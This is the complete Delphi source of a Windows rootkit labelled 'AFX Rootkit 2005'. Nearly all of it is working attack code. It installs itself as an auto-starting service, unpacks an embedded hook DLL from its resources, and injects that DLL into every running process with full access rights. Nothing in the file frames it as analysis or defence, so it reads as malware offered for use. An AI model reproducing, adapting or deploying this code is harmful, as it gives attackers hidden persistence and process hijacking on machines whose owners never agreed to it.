{
  AFX Rootkit 2005 by Aphex
  http://www.iamaphex.net
  aphex@iamaphex.net
}

program root;

{$R 'rsrc.res' 'rsrc.rc'}

uses
  Windows,
  WinSvc,
  TlHelp32,
  afxCodeHook;

var
  ServiceName: pchar = '';

var
  Status: TServiceStatus;
  StatusHandle: SERVICE_STATUS_HANDLE;
  ServiceTable: array [0..1] of TServiceTableEntry;
  Stopped: boolean;
  Paused: boolean;

function ExtractFilePath(FileName: string): string;
begin
  Result := '';
  while ((Pos('\', FileName) <> 0) or (Pos('/', FileName) <> 0)) do
  begin
    Result := Result + Copy(FileName, 1, 1);
    Delete(FileName, 1, 1);
  end;
end;

function GetFolder: string;
var
  FileName: string;
  FilePath: array [0..MAX_PATH - 1] of char;
begin
  Result := '';
  GetModuleFileName(hInstance, FilePath, MAX_PATH);
  FileName := string(FilePath);
  while ((Pos('\', FileName) <> 0) or (Pos('/', FileName) <> 0)) do
  begin
    Result := Result + Copy(FileName, 1, 1);
    Delete(FileName, 1, 1);
  end;
  Delete(Result, Length(Result), 1);
  while Pos('\', Result) <> 0 do Delete(Result, 1, Pos('\', Result));
  while Pos('/', Result) <> 0 do Delete(Result, 1, Pos('/', Result));
end;

function GetSystemPath: string;
var
  Path: array [0..MAX_PATH - 1] of Char;
begin
  GetSystemDirectory(Path, SizeOf(Path));
  Result := string(Path) + '\';
end;

procedure Inject;
var
  ResourcePointer: pchar;
  ResourceLocation: HRSRC;
  ResourceSize, BytesWritten: Longword;
  ResDataHandle, FileHandle: THandle;
  ProcessHandle: THandle;
  Process32: TProcessEntry32;
  ProcessSnapshot: THandle;
  DllPath: string;
  Zero: array [0..255] of char;
  FileMem: pointer;
begin
  DllPath := ExtractFilePath(ParamStr(0)) + 'hook.dll';
  if True then
  begin
    ResourceLocation := FindResource(HInstance, 'a01', RT_RCDATA);
    if ResourceLocation <> 0 then
    begin
      ResourceSize := SizeofResource(HInstance, ResourceLocation);
      if ResourceSize <> 0 then
      begin
        ResDataHandle := LoadResource(HInstance, ResourceLocation);
        if ResDataHandle <> 0 then
        begin
          ResourcePointer := LockResource(ResDataHandle);
          if ResourcePointer <> nil then
          begin
            FileHandle := CreateFile(pchar(DllPath), GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
            if FileHandle <> INVALID_HANDLE_VALUE then
            begin
              WriteFile(FileHandle, ResourcePointer^, ResourceSize, BytesWritten, nil);
              SetFilePointer(FileHandle, $4a54, nil, FILE_BEGIN);
              ZeroMemory(@Zero, 256);
              WriteFile(FileHandle, Zero, 256, BytesWritten, nil);
              SetFilePointer(FileHandle, $4a54, nil, FILE_BEGIN);
              WriteFile(FileHandle, pointer(DllPath)^, Length(DllPath) + 1, BytesWritten, nil);
              GetMem(FileMem, ResourceSize);
              SetFilePointer(FileHandle, 0, nil, FILE_BEGIN);
              ReadFile(FileHandle, FileMem^, ResourceSize, BytesWritten, nil);
              CloseHandle(FileHandle);
              ProcessSnapshot := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
              Process32.dwSize := SizeOf(TProcessEntry32);
              Process32First(ProcessSnapshot, Process32);
              repeat
                ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, Process32.th32ProcessID);
                if ProcessHandle <> 0 then
                begin
                  if GetCurrentProcessId <> Process32.th32ProcessID then InjectLibrary(ProcessHandle, FileMem);
                end;
                CloseHandle(ProcessHandle);
              until not (Process32Next(ProcessSnapshot, Process32));
              CloseHandle(ProcessSnapshot);
            end;
          end;
        end;
      end;
    end;
  end;
end;

procedure ServiceMain;
begin
  Inject;
  repeat
    if not Paused then
    begin
      Sleep(1000);
    end;
  until Stopped;
end;

procedure ServiceCtrlHandler(Control: dword); stdcall;
begin
  case Control of
    SERVICE_CONTROL_STOP:
      begin
        Stopped := True;
        Status.dwCurrentState := SERVICE_STOP_PENDING;
        SetServiceStatus(StatusHandle, Status);
      end;
    SERVICE_CONTROL_PAUSE:
      begin
        Paused := True;
        Status.dwcurrentstate := SERVICE_PAUSED;
        SetServiceStatus(StatusHandle, Status);
      end;
    SERVICE_CONTROL_CONTINUE:
      begin
        Paused := False;
        Status.dwCurrentState := SERVICE_RUNNING;
        SetServiceStatus(StatusHandle, Status);
      end;
    SERVICE_CONTROL_INTERROGATE: SetServiceStatus(StatusHandle, Status);
    SERVICE_CONTROL_SHUTDOWN: Stopped := True;
  end;
end;

procedure ServiceCtrlDispatcher(dwArgc: dword; var lpszArgv: pchar); stdcall;
begin
  StatusHandle := RegisterServiceCtrlHandler(ServiceName, @ServiceCtrlHandler);
  if StatusHandle <> 0 then
  begin
    ZeroMemory(@Status, SizeOf(Status));
    Status.dwServiceType := SERVICE_WIN32_OWN_PROCESS or SERVICE_INTERACTIVE_PROCESS;
    Status.dwCurrentState:= SERVICE_START_PENDING;
    Status.dwControlsAccepted := SERVICE_ACCEPT_STOP or SERVICE_ACCEPT_PAUSE_CONTINUE;
    Status.dwWaitHint := 1000;
    SetServiceStatus(StatusHandle, Status);
    Stopped := False;
    Paused := False;
    Status.dwCurrentState := SERVICE_RUNNING;
    SetServiceStatus(StatusHandle, Status);
    ServiceMain;
    Status.dwCurrentState := SERVICE_STOPPED;
    SetServiceStatus(StatusHandle, Status);
  end;
end;

procedure UninstallService(ServiceName: pchar);
var
  SCManager: SC_HANDLE;
  Service: SC_HANDLE;
begin
  SCManager := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  if SCManager = 0 then Exit;
  try
    Service := OpenService(SCManager, ServiceName, SERVICE_ALL_ACCESS);
    ControlService(Service, SERVICE_CONTROL_STOP, Status);
    DeleteService(Service);
    CloseServiceHandle(Service);
  finally
    CloseServiceHandle(SCManager);
  end;
end;

procedure InstallService(ServiceName, DisplayName: pchar; FileName: string);
var
  SCManager: SC_HANDLE;
  Service: SC_HANDLE;
  Args: pchar;
begin
  SCManager := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  if SCManager = 0 then Exit;
  try
    Service := CreateService(SCManager, ServiceName, DisplayName, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS or SERVICE_INTERACTIVE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, pchar(FileName), nil, nil, nil, nil, nil);
    Args := nil;
    StartService(Service, 0, Args);
    CloseServiceHandle(Service);
  finally
    CloseServiceHandle(SCManager);
  end;
end;

begin
  ServiceName := pchar(GetFolder);
  if ParamStr(1) = '/i' then
  begin
    InstallService(ServiceName, '', ParamStr(0));
  end
  else if ParamStr(1) = '/u' then
  begin
    UninstallService(ServiceName);
  end
  else
  begin
    ServiceTable[0].lpServiceName := ServiceName;
    ServiceTable[0].lpServiceProc := @ServiceCtrlDispatcher;
    ServiceTable[1].lpServiceName := nil;
    ServiceTable[1].lpServiceProc := nil;
    StartServiceCtrlDispatcher(ServiceTable[0]);
  end;
end.
